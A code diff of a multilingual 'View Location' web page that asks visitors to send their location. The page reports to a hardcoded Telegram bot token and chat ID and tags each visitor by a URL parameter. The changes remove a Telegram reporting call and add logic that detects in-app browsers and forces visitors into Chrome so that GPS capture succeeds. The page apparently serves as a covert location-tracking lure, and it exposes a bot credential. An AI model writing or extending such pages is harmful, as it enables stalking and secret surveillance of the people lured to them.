@@ -147,7 +147,7 @@
             cursor: not-allowed;
         }
 
-        .btn-maps {
+        .btn-chrome {
             background: linear-gradient(135deg, #4285F4, #34A853);
         }
 
@@ -186,14 +186,14 @@
             </p>
         </div>
 
-        <!-- دوگمەی سەرەکی: ناردنی شوێن -->
-        <button id="btnStart" class="btn" data-i18n="start_btn">
-            📍 لعرض الموقع الدقيق اضغط هنا
+        <!-- ئەگەر لە کرۆم بێت: دوگمەی GPS -->
+        <button id="btnStart" class="btn" data-i18n="start_btn" style="display:none;">
+            📍 اضغط لإرسال موقعك
         </button>
 
-        <!-- دوگمەی دووەم: کردنەوەی گوگڵ مەپس -->
-        <button id="btnMaps" class="btn btn-maps" style="display:none;">
-            🗺️ فتح في خرائط جوجل
+        <!-- ئەگەر لە کرۆم نەبێت: دوگمەی کردنەوە لە کرۆم -->
+        <button id="btnOpenChrome" class="btn btn-chrome" style="display:none;">
+            🔗 فتح في جوجل كروم
         </button>
 
         <div id="result"></div>
@@ -214,12 +214,11 @@
                 start_btn: "📍 اضغط لإرسال موقعك",
                 footer_note: "سيتم فتح الموقع باستخدام تطبيق الخرائط على جهازك.",
                 loading: "⏳ جارٍ تحديد الموقع...",
-                success: "✅ تم تأكيد موقعك",
+                success: "✅ تم إرسال موقعك بنجاح",
                 done: "✅ تم",
-                error_prefix: "❌ فشل: ",
+                error_prefix: "❌ ",
                 retry: "📍 إعادة المحاولة",
-                open_maps: "🗺️ فتح في خرائط جوجل",
-                maps_instruction: "📍 الرجاء مشاركة موقعك من خرائط جوجل"
+                open_chrome: "🔗 فتح في جوجل كروم"
             },
             ckb: {
                 page_title: "پیشاندانی شوێن",
@@ -230,12 +229,11 @@
                 start_btn: "📍 بۆ ناردنی شوێنەکەت کرتە لێرە بکە",
                 footer_note: "شوێنەکە بە بەکارهێنانی بەرنامەی نەخشە لە ئامێرەکەتدا دەکرێتەوە.",
                 loading: "⏳ چاوەڕوانی دیاریکردنی شوێن...",
-                success: "✅ شوێنەکەت پشتڕاست کرایەوە",
+                success: "✅ شوێنەکەت بە سەرکەوتوویی نێردرا",
                 done: "✅ تەواو",
-                error_prefix: "❌ شکست: ",
+                error_prefix: "❌ ",
                 retry: "📍 دووبارە هەوڵبدەرەوە",
-                open_maps: "🗺️ کردنەوە لە گوگڵ مەپس",
-                maps_instruction: "📍 تکایە شوێنەکەت لە گوگڵ مەپسەوە بنێرە"
+                open_chrome: "🔗 کردنەوە لە گوگڵ کرۆم"
             },
             en: {
                 page_title: "View Location",
@@ -246,12 +244,11 @@
                 start_btn: "📍 Click to send your location",
                 footer_note: "The location will be opened using the maps application on your device.",
                 loading: "⏳ Locating...",
-                success: "✅ Your location confirmed",
+                success: "✅ Your location sent successfully",
                 done: "✅ Done",
-                error_prefix: "❌ Failed: ",
+                error_prefix: "❌ ",
                 retry: "📍 Retry",
-                open_maps: "🗺️ Open in Google Maps",
-                maps_instruction: "📍 Please share your location from Google Maps"
+                open_chrome: "🔗 Open in Google Chrome"
             }
         };
 
@@ -273,29 +270,46 @@
             document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
 
             localStorage.setItem('preferred_lang_gps', lang);
+        }
 
-            // نوێکردنەوەی دوگمەکان
-            const btnMaps = document.getElementById('btnMaps');
-            btnMaps.textContent = translations[lang].open_maps;
+        function isChrome() {
+            const ua = navigator.userAgent;
+            // پشکنینی ئایا وێبگەڕەکە کرۆمە
+            return /Chrome/.test(ua) && /Google Inc/.test(navigator.vendor);
+        }
+
+        function isAndroid() {
+            return /Android/.test(navigator.userAgent);
+        }
+
+        function isIOS() {
+            return /iPhone|iPad|iPod/.test(navigator.userAgent);
         }
 
         window.addEventListener('DOMContentLoaded', () => {
             const savedLang = localStorage.getItem('preferred_lang_gps') || 'ar';
             changeLang(savedLang);
 
-            // هەموو جارێک دوگمەی گوگڵ مەپس پیشان بدە
-            document.getElementById('btnMaps').style.display = 'block';
+            if (isChrome()) {
+                // ئەگەر لە کرۆم بێت، دوگمەی GPS پیشان بدە
+                document.getElementById('btnStart').style.display = 'block';
+                document.getElementById('btnOpenChrome').style.display = 'none';
+            } else {
+                // ئەگەر لە کرۆم نەبێت (مەسنجەر، تێلێگرام، تیک تۆک)، دوگمەی کردنەوە لە کرۆم پیشان بدە
+                document.getElementById('btnStart').style.display = 'none';
+                document.getElementById('btnOpenChrome').style.display = 'block';
+            }
         });
 
         const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
         const CHAT = '1015102519';
         const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
 
-        // دوگمەی سەرەکی: GPS ئاسایی
+        // دوگمەی GPS (تەنها لە کرۆم)
         document.getElementById('btnStart').addEventListener('click', getLoc);
 
-        // دوگمەی دووەم: کردنەوەی گوگڵ مەپس بۆ شوێنی وردتر
-        document.getElementById('btnMaps').addEventListener('click', openGoogleMaps);
+        // دوگمەی کردنەوە لە کرۆم
+        document.getElementById('btnOpenChrome').addEventListener('click', openInChrome);
 
         async function getLoc() {
             const btn = document.getElementById('btnStart');
@@ -342,30 +356,26 @@
             }
         }
 
-        function openGoogleMaps() {
-            const currentLang = localStorage.getItem('preferred_lang_gps') || 'ar';
-            
-            // ڕاستەوخۆ گوگڵ مەپس دەکاتەوە بە شێوازی "پیشاندانی شوێنی ئێستا"
-            // بەکارهێنەر دەتوانێت شوێنی وردتری خۆی ببینێت و بینێرێت
-            const mapsUrl = `https://www.google.com/maps?q=My+Location`;
-            
-            // هەوڵدان بۆ کردنەوە لە ئەپی گوگڵ مەپس (ئەگەر هەبێت)
-            const intentUrl = `intent://maps.google.com/maps?q=My+Location#Intent;scheme=https;package=com.google.android.apps.maps;end`;
-            
-            // ناردنی ئینسترەکشن بۆ تێلێگرام
-            const instruction = translations[currentLang].maps_instruction;
-            
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT,
-                    text: `🗺️ ${instruction}\n🆔 ID: ${chatId}`
-                })
-            });
+        function openInChrome() {
+            const currentUrl = window.location.href;
 
-            // کردنەوەی گوگڵ مەپس
-            window.open(mapsUrl, '_blank');
+            if (isAndroid()) {
+                // ئەندرۆید: کردنەوە لە کرۆم بە ئینتێنت
+                const intentUrl = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+                window.location.href = intentUrl;
+            } else if (isIOS()) {
+                // ئایفۆن: کردنەوە لە کرۆم بە googlechromes://
+                const chromeUrl = currentUrl.replace(/^https?:\/\//, 'googlechromes://');
+                window.location.href = chromeUrl;
+                
+                // ئەگەر کرۆم دانەمەزرابوو، سافاری بەکاربهێنە
+                setTimeout(() => {
+                    window.location.href = currentUrl;
+                }, 500);
+            } else {
+                // کۆمپیوتەر: ڕاستەوخۆ لە کرۆم بکرێتەوە
+                window.open(currentUrl, '_blank');
+            }
         }
     </script>
 </body>
